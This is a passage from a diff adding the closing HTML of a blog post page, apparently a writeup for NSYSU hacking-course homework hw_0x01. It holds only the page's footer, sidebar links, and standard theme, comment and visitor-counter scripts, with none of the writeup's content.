+    <strong>Post author:  </strong>yctseng
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="/blog.eevee.tw/2020/201104-htcf-hw1-writeup/" title="NSYSU 駭客攻防 hw_0x01 Writeup">blog.eevee.tw/2020/201104-htcf-hw1-writeup/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-TW" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/HTCF/" rel="tag"># HTCF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/200819-first-year-graduate-summary/" rel="prev" title="碩一生活總結 & Summer Conf. 跑起來">
+      <i class="fa fa-chevron-left"></i> 碩一生活總結 & Summer Conf. 跑起來
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Description"><span class="nav-number">1.</span> <span class="nav-text">Description</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution"><span class="nav-number">2.</span> <span class="nav-text">Solution</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Problem"><span class="nav-number">3.</span> <span class="nav-text">Problem</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Extra"><span class="nav-number">4.</span> <span class="nav-text">Extra</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yctseng"
+      src="/images/yctseng.png">
+  <p class="site-author-name" itemprop="name">yctseng</p>
+  <div class="site-description" itemprop="description">競程廢物、資安菜鳥 >_<</div>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yctseng1227" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yctseng1227" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.facebook.com/yctseng1227/" title="Facebook → https:&#x2F;&#x2F;www.facebook.com&#x2F;yctseng1227&#x2F;" rel="noopener" target="_blank"><i class="fab fa-facebook fa-fw"></i>Facebook</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.instagram.com/yctseng1227/" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yctseng1227&#x2F;" rel="noopener" target="_blank"><i class="fab fa-instagram fa-fw"></i>Instagram</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://codeforces.com/profile/yctseng/" title="Codeforces → http:&#x2F;&#x2F;codeforces.com&#x2F;profile&#x2F;yctseng&#x2F;" rel="noopener" target="_blank"><i class="fas fa-poll fa-fw"></i>Codeforces</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://ctftime.org/user/65888" title="CTFtime → https:&#x2F;&#x2F;ctftime.org&#x2F;user&#x2F;65888" rel="noopener" target="_blank"><i class="fas fa-flag-checkered fa-fw"></i>CTFtime</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.facebook.com/MacacaHub-107811803945876/" title="MacacaHub → https:&#x2F;&#x2F;www.facebook.com&#x2F;MacacaHub-107811803945876&#x2F;" rel="noopener" target="_blank"><i class="fas fa-chess-queen fa-fw"></i>MacacaHub</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友站Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.tinytsunami.info/" title="https:&#x2F;&#x2F;www.tinytsunami.info" rel="noopener" target="_blank">羊羽手札</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://meetonfriday.com/" title="https:&#x2F;&#x2F;meetonfriday.com" rel="noopener" target="_blank">星期五。見面</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.laiyelling.com/" title="https:&#x2F;&#x2F;www.laiyelling.com" rel="noopener" target="_blank">LaiYelling 的地下室</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://sophiexin9636.github.io/" title="https:&#x2F;&#x2F;sophiexin9636.github.io" rel="noopener" target="_blank">Shin's Blog</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-bong"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yctseng</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">90k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">2:43</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/theme-next/theme-next-pjax@0/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+  
+
+<script>
+  var disqus_config = function() {
+    this.page.url = "blog.eevee.tw/2020/201104-htcf-hw1-writeup/";
+    this.page.identifier = "2020/201104-htcf-hw1-writeup/";
+    this.page.title = "NSYSU 駭客攻防 hw_0x01 Writeup";
+    };
+  NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
+    if (window.DISQUS) {
+      DISQUS.reset({
+        reload: true,
+        config: disqus_config
+      });
+    } else {
+      var d = document, s = d.createElement('script');
+      s.src = 'https://yctseng1227-blog.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', '' + +new Date());
+      (d.head || d.body).appendChild(s);
+    }
+  });
+</script>
+
+    </div>
+</body>
+</html>
